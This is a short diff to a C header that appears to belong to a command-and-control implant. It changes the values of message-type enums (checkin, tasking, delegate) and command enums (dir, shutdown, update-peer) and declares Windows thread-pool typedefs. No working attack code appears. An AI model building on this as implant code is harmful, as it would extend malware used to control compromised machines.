@@ -170,19 +170,19 @@ typedef VOID (WINAPI* TpPostWork_t)(PTP_WORK ptpWork);
 typedef VOID (WINAPI* TpReleaseWork_t)(PTP_WORK ptpWork);
 
 enum MessageType {
-	TypeCheckin 	= 0x00000001,
-	TypeTasking 	= 0x00000002,
-	TypeResponse 	= 0x00000003,
-	TypeDelegate 	= 0x00000004,
-	TypeSegment 	= 0x00000005,
+	TypeCheckin 	= 1,
+	TypeTasking 	= 2,
+	TypeResponse 	= 3,
+	TypeDelegate 	= 4,
+	TypeSegment 	= 5,
 };
 
 enum CommandType {
-	CommandDir      	= 0x7FFFFFFF,
-	CommandMods     	= 0x7FFFFFFE,
-	CommandNoJob    	= 0x7FFFFFFD,
-	CommandShutdown 	= 0x7FFFFFFC,
-	CommandUpdatePeer 	= 0x7FFFFFFB,
+	CommandDir      	= 1,
+	CommandMods     	= 2,
+	CommandNoJob    	= 3,
+	CommandShutdown 	= 4,
+	CommandUpdatePeer 	= 5,
 };
 
 typedef struct {
